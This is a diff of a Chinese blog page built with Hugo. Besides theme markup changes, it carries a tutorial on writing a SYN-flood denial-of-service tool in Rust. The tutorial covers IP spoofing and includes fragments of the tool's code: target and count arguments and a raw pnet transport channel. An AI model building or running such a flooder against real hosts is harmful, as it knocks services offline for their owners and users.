@@ -1,7 +1,33 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
+<html lang="zh"
+  x-data
+  :class="$store.darkMode.class()"
+  :data-theme="$store.darkMode.theme()">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门 | Liangdi&#39;s Blog</title>
+
+    
+<link href="/" rel="icon" type="image/x-icon" />
+
+
+<link rel="canonical" href="http://localhost:1313/p/rust-hacking-programing-syn-flood-ddos/" />
+
+
+
+<meta name="author" content="" />
+<meta name="description" content="" />
+
+
+
+<meta name="generator" content="Hugo 0.134.3">
+
+
+<meta property="og:url" content="http://localhost:1313/p/rust-hacking-programing-syn-flood-ddos/">
+  <meta property="og:site_name" content="Liangdi&#39;s Blog">
+  <meta property="og:title" content="Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门">
+  <meta property="og:description" content="概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
 如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.
 那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.
 DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.
@@ -9,12 +35,23 @@ DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上
 SYN Flood 原理 SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/
 SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.
 那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.
-准备工作  还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现).'><title>Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门</title>
+准备工作 还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现). TCP 协议就不展开讲了. 编码实现 创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2022-06-03T16:01:32+08:00">
+    <meta property="article:modified_time" content="2022-06-03T16:01:32+08:00">
+    <meta property="article:tag" content="Rust">
+    <meta property="article:tag" content="Hacking Programing">
+    <meta property="article:tag" content="Syn Flood">
+    <meta property="article:tag" content="Ddos">
 
-<link rel='canonical' href='https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/'>
 
-<link rel="stylesheet" href="/scss/style.min.070a1f1fa7cad6c7ccb4af4d49452541cddf145911de65e6dbd542983c495cd1.css"><meta property='og:title' content='Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门'>
-<meta property='og:description' content='概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门">
+  <meta name="twitter:description" content="概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
 如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.
 那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.
 DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.
@@ -22,292 +59,269 @@ DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上
 SYN Flood 原理 SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/
 SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.
 那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.
-准备工作  还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现).'>
-<meta property='og:url' content='https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/'>
-<meta property='og:site_name' content='Liangdi&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='rust' /><meta property='article:tag' content='hacking programing' /><meta property='article:tag' content='syn flood' /><meta property='article:tag' content='ddos' /><meta property='article:published_time' content='2022-06-03T16:01:32&#43;08:00'/><meta property='article:modified_time' content='2022-06-03T16:01:32&#43;08:00'/><meta property='og:image' content='https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood.png' />
-<meta name="twitter:title" content="Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门">
-<meta name="twitter:description" content="概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
-如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.
-那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.
-DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.
-DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上实现的.
-SYN Flood 原理 SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/
-SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.
-那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.
-准备工作  还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现)."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood.png' />
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
-</script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu28bd9f10f249b3300884b5b9ecc99bfa_1618568_300x0_resize_box_3.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">🔥</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">Liangdi&#39;s Blog</a></h1>
-            <h2 class="site-description">关注开源技术.</h2>
-        </div>
-    </header><ol class="social-menu">
-            
-                <li>
-                    <a 
-                        href='https://github.com/Liangdi'
-                        target="_blank"
-                        title="GitHub"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
+准备工作 还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现). TCP 协议就不展开讲了. 编码实现 创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能">
 
 
 
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
 
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
+<link rel="stylesheet" href="/css/output.css" />
 
 
 
-                
-                <span>首页</span>
-            </a>
-        </li>
-        
-        
 
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        <div class="menu-bottom-section">
-            
-            
-                <li id="dark-mode-toggle">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                    <span>暗色模式</span>
-                </li>
-            
-        </div>
-    </ol>
-</aside>
-<main class="main full-width">
-    <article class="has-image main-article">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/rust-hacking-programing-syn-flood-ddos/">
-                <img src="/p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood_hu3ef4952130487b1cfcbb0e783be9d119_46853_800x0_resize_box_3.png"
-                        srcset="/p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood_hu3ef4952130487b1cfcbb0e783be9d119_46853_800x0_resize_box_3.png 800w, /p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood_hu3ef4952130487b1cfcbb0e783be9d119_46853_1600x0_resize_box_3.png 1600w"
-                        width="800" 
-                        height="400" 
-                        loading="lazy"
-                        alt="Featured image of post Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门" />
-                
-            </a>
-        </div>
     
 
-    <div class="article-details">
+
+<style>
+  pre {
+    padding: 1em;
+    overflow: auto;
+  }
+</style>
+
+
+
+
+
+
+
+
+
     
 
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/rust-hacking-programing-syn-flood-ddos/">Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门</a>
-        </h2>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+  </head>
+
+  <body x-data="{
+    flip: false,
+  }">
     
+    <div id="dream-global-bg"></div>
+
+    
+<nav class="mt-4 lg:mt-8 py-4">
+
+  
+  <div class="container flex justify-between px-4">
+  
+    <section class="flex items-center gap-4">
+      <div class="avatar cursor-pointer hover:online" @click="flip = !flip" title="">
+        <div class="h-10 rounded-full">
+          <img src="/" alt="" />
+        </div>
+      </div>
+
+      
+    </section>
+
+    <div class="dropdown dropdown-end sm:hidden">
+      <div tabindex="0" role="button" class="btn btn-ghost btn-square" aria-label="Select an option">
+        <ion-icon name="menu" class="text-2xl"></ion-icon>
+      </div>
+      <ul class="dropdown-content menu w-36 bg-base-100 rounded-box z-[1] shadow-md">
         
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/tags" title="">
+    <ion-icon name="pricetags"></ion-icon>
+    
+  </a>
+</li>
+
+
+
+
+
+
+      </ul>
     </div>
+    <section class="hidden sm:flex sm:items-center sm:gap-2 md:gap-4">
+      
 
+      
+      
+
+      
+
+      
+      
+
+
+
+
+
+      
+      
+
+
+
+
+
+      
+      
+
+
+
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/tags" title="">
+  <ion-icon class="group-hover:text-primary-content" name="pricetags"></ion-icon>
+</a>
+
+
+      
+
+      
+
+      
+    </section>
+  </div>
+</nav>
+
+
+    <div class="flip-container" :class="{ 'flip-it': flip }">
+      <div class="flipper">
+        <div class="front">
+          <div class="container">
+            
+<div class="mt-4 px-4">
+  
+  <div>
+  
     
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Jun 03, 2022</time>
-            </div>
-        
+    <article class="mx-auto prose prose-quoteless dark:prose-invert" id="dream-single-post-main" itemscope itemtype="http://schema.org/Article">
+      
+  <meta itemprop="name" content="Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门">
+  <meta itemprop="description" content="概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/
+如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.
+那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.
+DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.
+DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上实现的.
+SYN Flood 原理 SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/
+SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.
+那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.
+准备工作 还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现). TCP 协议就不展开讲了. 编码实现 创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能">
+  <meta itemprop="datePublished" content="2022-06-03T16:01:32+08:00">
+  <meta itemprop="dateModified" content="2022-06-03T16:01:32+08:00">
+  <meta itemprop="wordCount" content="641">
+  <meta itemprop="keywords" content="Rust,Hacking Programing,Syn Flood,Ddos">
 
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
+      <header>
+        <h1 itemprop="headline">Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门</h1>
+        <p class="text-sm">
+          
+            星期五, 6月 3, 2022
+          
 
+          | <span>4</span>
 
+          
+          | <span>
+            
+              星期五, 6月 3, 2022
+            </span>
+          
+        </p>
+        <div class="flex justify-between">
+          <div class="flex items-center">
+  
+  <span>@</span>
+  
 
-                <time class="article-time--reading">
-                    阅读时长: 3 分钟
-                </time>
-            </div>
-        
-    </footer>
-    
-
-    
+  <span itemprop="author" itemscope itemtype="https://schema.org/Person">
+  
+    <span itemprop="name"></span>
+  
+  </span>
 </div>
-</header>
 
-    <section class="article-content">
-    
-    
-    <h2 id="概述">概述</h2>
-<p>DDoS 介绍: <a class="link" href="https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/"  target="_blank" rel="noopener"
-    >https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/</a></p>
+
+          <div class="flex items-center gap-2">
+  
+  
+
+  
+  
+  
+  
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://x.com/intent/post?text=Rust%20%e9%bb%91%e5%ae%a2%e7%bc%96%e7%a8%8b%20-%20SYN%20Flood%20%e6%95%b2%e5%bc%80%20DDoS%20%e7%9a%84%e5%a4%a7%e9%97%a8&amp;url=http://localhost:1313/p/rust-hacking-programing-syn-flood-ddos/" target="_blank" rel="noopener noreferrer"
+      title="Share on X">
+      <ion-icon class="group-hover:text-primary-content" name="logo-x"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://facebook.com/sharer/sharer.php?u=http://localhost:1313/p/rust-hacking-programing-syn-flood-ddos/" target="_blank" rel="noopener noreferrer"
+      title="Share on Facebook">
+      <ion-icon class="group-hover:text-primary-content" name="logo-facebook"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://wa.me/?text=Rust%20%e9%bb%91%e5%ae%a2%e7%bc%96%e7%a8%8b%20-%20SYN%20Flood%20%e6%95%b2%e5%bc%80%20DDoS%20%e7%9a%84%e5%a4%a7%e9%97%a8%20http://localhost:1313/p/rust-hacking-programing-syn-flood-ddos/" target="_blank" rel="noopener noreferrer"
+      title="Share on WhatsApp">
+      <ion-icon class="group-hover:text-primary-content" name="logo-whatsapp"></ion-icon>
+    </a>
+  
+
+  
+  
+</div>
+
+        </div>
+      </header>
+
+      
+
+      <h2 id="概述">概述</h2>
+<p>DDoS 介绍: <a href="https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/">https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/</a></p>
 <p>如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.</p>
 <p>那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.</p>
 <p>DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.</p>
 <p>DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上实现的.</p>
 <h2 id="syn-flood-原理">SYN Flood 原理</h2>
-<p>SYN Flood 介绍: <a class="link" href="https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/"  target="_blank" rel="noopener"
-    >https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/</a></p>
+<p>SYN Flood 介绍: <a href="https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/">https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/</a></p>
 <p>SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.</p>
 <p>那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.</p>
 <h2 id="准备工作">准备工作</h2>
@@ -453,18 +467,18 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">#[clap(short, long)]</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">count</span>:<span class="kt">u32</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">IPV4_HEADER_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">TEST_DATA_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="no">IPV4_HEADER_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="no">TEST_DATA_LEN</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Args</span>::<span class="n">parse</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;args:{:?}&#34;</span><span class="p">,</span><span class="n">args</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;args:</span><span class="si">{:?}</span><span class="s">&#34;</span><span class="p">,</span><span class="n">args</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 选择 3 层 IPv4 协议, 构建发送器
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Layer3</span><span class="p">(</span><span class="n">IpNextHeaderProtocols</span>::<span class="n">Ipv4</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="p">(</span><span class="k">mut</span><span class="w"> </span><span class="n">tx</span><span class="p">,</span><span class="w"> </span><span class="n">_</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w">  </span><span class="n">transport_channel</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span><span class="n">protocol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Ok</span><span class="p">((</span><span class="w"> </span><span class="n">tx</span><span class="p">,</span><span class="w"> </span><span class="n">rx</span><span class="p">))</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">tx</span><span class="p">,</span><span class="n">rx</span><span class="p">),</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">panic!</span><span class="p">(</span><span class="s">&#34;Error happened {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">panic!</span><span class="p">(</span><span class="s">&#34;Error happened </span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">),</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">target</span>: <span class="nc">Ipv4Addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">parse</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
@@ -472,7 +486,7 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
